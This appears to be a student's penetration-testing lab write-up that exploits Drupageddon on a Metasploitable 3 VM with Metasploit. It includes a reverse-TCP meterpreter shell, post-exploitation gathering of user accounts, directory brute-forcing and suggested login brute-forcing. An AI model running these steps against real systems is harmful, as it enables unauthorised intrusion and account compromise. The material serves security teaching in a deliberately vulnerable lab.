# Exercises
Penetration testing exercise using metasploit on Drupal. The exercise
targets the Drupal web application framework running under Linux in the
metasploitable 3 image.

In this lab we use the Kali machine (for penetration testing) and the vulnerable machine
is the metasploitable Ubuntu Linux image. We’ll
* target a specific service 
* research a known vulnerability 
* exploit it 
* and look into metasploit tools for the post-exploitation phase

# Background
Searching for exploits

````console
berkankutuk@kali:~$ searchsploit drupal
berkankutuk@kali:~$ msfconsole
msf > search drupal
Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
````

**†Which vulnerabilities do you think can be used? Pick two potential vulnerabilities and describe them in terms of why 
you picked them, i.e., date and exploit effect.**

**Drupageddon**
````console
msf > info exploit/unix/webapp/drupal_drupalgeddon2
      Name: Drupal HTTP Parameter Key/Value SQL Injection
    Module: exploit/multi/http/drupal_drupageddon
  Platform: PHP
      Arch: php
Privileged: No
    License: Metasploit Framework License (BSD)
      Rank: Excellent
  Disclosed: 2014-10-15

Provided by:
SektionEins
WhiteWinterWolf
Christian Mehlmauer <FireFart@gmail.com>
Brandon Perry

Available targets:
Id  Name
  --  ----
0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
1   Drupal 7.0 - 7.31 (user-post PHP injection method)

Check supported:
No

Basic options:
Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
Proxies                     no        A proxy chain of format type:host:port[,type:host:p
ort][...]
RHOSTS                      yes       The target host(s), see https://github.com/rapid7/m
etasploit-framework/wiki/Using-Metasploit
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /                yes       The target URI of the Drupal installation
VHOST                       no        HTTP server virtual host

Payload information:

Description:
This module exploits the Drupal HTTP Parameter Key/Value SQL
Injection (aka Drupageddon) in order to achieve a remote shell on
the vulnerable instance. This module was tested against Drupal 7.0
and 7.31 (was fixed in 7.32). Two methods are available to trigger
the PHP payload on the target: - set TARGET 0: Form-cache PHP
injection method (default). This uses the SQLi to upload a malicious
form to Drupal's cache, then trigger the cache entry to execute the
payload using a POP chain. - set TARGET 1: User-post injection
method. This creates a new Drupal user, adds it to the
administrators group, enable Drupal's PHP module, grant the
administrators the right to bundle PHP code in their post, create a
new post containing the payload and preview it to trigger the
payload execution.

References:
https://nvd.nist.gov/vuln/detail/CVE-2014-3704
https://www.drupal.org/SA-CORE-2014-005
http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
https://www.whitewinterwolf.com/posts/2017/11/16/drupageddon-revisited-a-new-path-from-sql-injection-to-remote-command-execution-cve-2014-3704/

Also known as:
Drupageddon

````

**drupal_coder_exec**
```console
        Name: Drupal CODER Module Remote Command Execution
      Module: exploit/unix/webapp/drupal_coder_exec
    Platform: Unix
        Arch: cmd
  Privileged: No
      License: Metasploit Framework License (BSD)
        Rank: Excellent
    Disclosed: 2016-07-13

  Provided by:
    Nicky Bloor <nick@nickbloor.co.uk>
    Mehmet Ince <mehmet@mehmetince.net>

  Available targets:
    Id  Name
    --  ----
    0   Automatic

  Check supported:
    Yes

  Basic options:
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                          ort][...]
    RHOSTS                      yes       The target host(s), see https://github.com/rapid7/m
                                          etasploit-framework/wiki/Using-Metasploit
    RPORT      80               yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       The target URI of the Drupal installation
    VHOST                       no        HTTP server virtual host

  Payload information:
    Space: 250
    Avoid: 1 characters

  Description:
    This module exploits a Remote Command Execution vulnerability in the 
    Drupal CODER Module. Unauthenticated users can execute arbitrary 
    commands under the context of the web server user. The CODER module 
    doesn't sufficiently validate user inputs in a script file that has 
    the PHP extension. A malicious unauthenticated user can make 
    requests directly to this file to execute arbitrary commands. The 
    module does not need to be enabled for this to be exploited. This 
    module was tested against CODER 2.5 with Drupal 7.5 installed on 
    Ubuntu Server.

  References:
    https://www.drupal.org/node/2765575

  ```

## Reason of choice
### Drupageddon
**Date**  
2014-10-15

**Exploit effect**  
Remote shell on the vulnerable instance using SQL injection by uploading a malicious
form to Drupal's cache.

### drupal_coder_exec
**Date**   
2016-07-13

**Exploit effect**  
Remote command execution on the Drupal CODER module. The CODER module doesn't validate user inputs in a script file with a PHP extension. A malicious unauthenticated user can thereby make requests directly to this file in order to execute arbitrary commands.

<hr>

**†For the rest of the tutorial, we will use the vulnerability dubbed drupageddon.
What is the underlying vulnerability?**  
The vulnerability is that it is possible to gain a remote shell by exploiting the Drupal HTTP parameter. Two methods are available where the first one uses SQLi to upload a malicious form to Drupal's cache, which triggers a cache entry that executes the payload. The second method is using the user-post ability, which can be used to create a new Drupal user that can be added to the administrators group in order to grant the administrator a right to bundle PHP code in their post. This post can then be previewedd to trigger a payload execution.

**†What is so severe about the issue?**  
It's a very easy attack that can make an attacker very powerful, thereby making the system highly vulnerable.

# Exploitation
Starting the exploit
````console
msf > use exploit/multi/http/drupal_drupageddon
msf > show options
Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:
                                         port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/
                                         metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)

````

Now let's set the options. RPORT, LHOST and LPORT looks fine as they are by default, so they won't be touched.
```console
msf > set RHOST 10.0.2.4
msf > set TARGETURI /drupal/
msf > exploit
meterpreter > ls
Listing: /var/www/html/drupal
=============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  174    fil   2011-07-27 16:17:40 -0400  .gitignore
100644/rw-r--r--  5410   fil   2011-07-27 16:17:40 -0400  .htaccess
100644/rw-r--r--  58875  fil   2011-07-27 16:17:40 -0400  CHANGELOG.txt
100644/rw-r--r--  996    fil   2011-07-27 16:17:40 -0400  COPYRIGHT.txt
100644/rw-r--r--  1447   fil   2011-07-27 16:17:40 -0400  INSTALL.mysql.txt
100644/rw-r--r--  1874   fil   2011-07-27 16:17:40 -0400  INSTALL.pgsql.txt
100644/rw-r--r--  1298   fil   2011-07-27 16:17:40 -0400  INSTALL.sqlite.txt
100644/rw-r--r--  17856  fil   2011-07-27 16:17:40 -0400  INSTALL.txt
100644/rw-r--r--  14940  fil   2011-02-23 19:47:51 -0500  LICENSE.txt
100644/rw-r--r--  7356   fil   2011-07-27 16:17:40 -0400  MAINTAINERS.txt
100644/rw-r--r--  3494   fil   2011-07-27 16:17:40 -0400  README.txt
100644/rw-r--r--  8811   fil   2011-07-27 16:17:40 -0400  UPGRADE.txt
100644/rw-r--r--  6605   fil   2011-07-27 16:17:40 -0400  authorize.php
100644/rw-r--r--  720    fil   2011-07-27 16:17:40 -0400  cron.php
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  includes
100644/rw-r--r--  529    fil   2011-07-27 16:17:40 -0400  index.php
100644/rw-r--r--  688    fil   2011-07-27 16:17:40 -0400  install.php
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  misc
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  modules
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  profiles
100644/rw-r--r--  1531   fil   2011-07-27 16:17:40 -0400  robots.txt
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  scripts
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  sites
040755/rwxr-xr-x  4096   dir   2011-07-27 16:17:40 -0400  themes
100644/rw-r--r--  18039  fil   2011-07-27 16:17:40 -0400  update.php
100644/rw-r--r--  2051   fil   2011-07-27 16:17:40 -0400  web.config
100644/rw-r--r--  417    fil   2011-07-27 16:17:40 -0400  xmlrpc.php
```

We are in!

# Post-Exploitation
**When you do have the meterpreter session, you can use the help command to see the
commands that you can run. Alternatively, you can run metasploits “post” modules to
execute additional functions. Post modules are used to execute further commands when
you have gained access into the system (which you have done). To see post modules for
linux you need to open a separate terminal and start metasploit again. At the “msf6>” prompt, you can then just enter “search post/linux”. For Windows you would search
“post/windows/”**

**What I would like you do to is to run a module that will give you system and user
information. Here it is.**

`meterpreter > run post/linux/gather/enum_system`

Searching for it
```console
msf > search post/linux/gather/enum_system
```

Now back to meterpreter
```console
meterpreter > run post/linux/gather/enum_system
```

As you can see all the data extracted from the Ubuntu machine is stored in your Kali
machine in the folder “`~/.msf4/loot`”.

Lets navigate to the location to see the files
```console
berkankutuk@kali:~$ cd /home/berkankutuk/.msf4/loot
berkankutuk@kali:~/.msf4/loot$ ls -l
-rw-r--r-- 1 kali kali    155 Oct  8 17:01 20221008170150_default_10.0.2.4_linux.version_329095.txt
-rw-r--r-- 1 kali kali     46 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_053110.txt
-rw-r--r-- 1 kali kali    345 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_086234.txt
-rw-r--r-- 1 kali kali    167 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_150281.txt
-rw-r--r-- 1 kali kali    560 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_155967.txt
-rw-r--r-- 1 kali kali   3606 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_324148.txt
-rw-r--r-- 1 kali kali 105772 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_837714.txt
-rw-r--r-- 1 kali kali     72 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_846978.txt
-rw-r--r-- 1 kali kali     67 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_953750.txt
-rw-r--r-- 1 kali kali    788 Oct  8 17:02 20221008170208_default_10.0.2.4_linux.enum.syste_961272.txt
```

**†What are possible activities/aims for the post-exploitation phase?**  
To gather system information that can be sensitive and therefore quite useful for an attacker.

**†Write out the list in the file that has the “User Accounts”?**  
Filename: `20221008170208_default_10.0.2.4_linux.enum.syste_086234.txt`

**Contents:**
```
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
sshd
statd
vagrant
dirmngr
leia_organa
luke_skywalker
han_solo
artoo_detoo
c_three_pio
ben_kenobi
darth_vader
anakin_skywalker
jarjar_binks
lando_calrissian
boba_fett
jabba_hutt
greedo
chewbacca
kylo_ren
mysql
avahi
colord
```

**†How does having a list of user names help?**  
To bruteforce login pages or SSH services.

**†What do the excellent post exploitation scripts for linux offer?**  
It collects installed packages, installed services, mount information, user list, user bash history and cron jobs.

# Reflection
**†What is the main issue with the web server? How did it help selecting potential
exploits?**  
Its using a very old version of the Drupal service which is vulnerable to multiple exploits hereby SQLi.

**†When opening the drupal web page, you are greeted by a warning. Do you think this is good practice? Why or why not?**  
It’s definitely not a good practice to show error and debug messages in production. These errors can make it easier for attackers to exploit and gather sensitive information about the application.

**†Given a more restrictive web server configuration, finding the relevant information wouldn’t have been that easy. Please check dirbuster, to be found in the “Web Application Analysis” menu. How could this tool help you finding information? Try it out on the Ubuntu metasploitable VM. Use `/usr/share/dirbuster/wordlists directorylist-2.3-medium.txt as dictionary`.**  
```console
berkankutuk@kali:~$ dirb http://10.0.2.4/drupal /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

This took way too long so i used gobuster instead

```console
berkankutuk@kali:~$ gobuster dir -u http://10.0.2.4/drupal -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
obuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.4/drupal
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/08 18:18:36 Starting gobuster in directory enumeration mode
===============================================================
/misc                 (Status: 301) [Size: 309] [--> http://10.0.2.4/drupal/misc/]
/themes               (Status: 301) [Size: 311] [--> http://10.0.2.4/drupal/themes/]
/modules              (Status: 301) [Size: 312] [--> http://10.0.2.4/drupal/modules/]
/scripts              (Status: 301) [Size: 312] [--> http://10.0.2.4/drupal/scripts/]
/sites                (Status: 301) [Size: 310] [--> http://10.0.2.4/drupal/sites/]  
/includes             (Status: 301) [Size: 313] [--> http://10.0.2.4/drupal/includes/]
/profiles             (Status: 301) [Size: 313] [--> http://10.0.2.4/drupal/profiles/]
                                                                                      
===============================================================
2022/10/08 18:21:25 Finished
===============================================================
```

**†How can effective spying with tools like dirbuster be prevented?**  
Using:
* An effective IDS system
* Using non-common directory names
* Configuring it through .htaccess (returning 404 for specific files)
* Implement CAPTCHA

**†This attack didn’t get us all the way to root. How would you continue the pentest? What would be your next actions?**  
Bruteforcing the login page with the earlier gathered usernames.

**†Do you have any specific things in mind you would try to get root access?**  
I would look for hidden files like .gitignore and try to explore these private pages. Another thing i would try is to create an account and look for the cookie value to see if i can use that to change my privilege on the website. If this fails, then i would try to enumerate the users through a bruteforce attack on the login page to see if i can get an admin account.

**†What makes getting a remote shell so powerful?**  
Not only can the user that connects through a remote shell see system information, but it can also lead to complete system takeover. 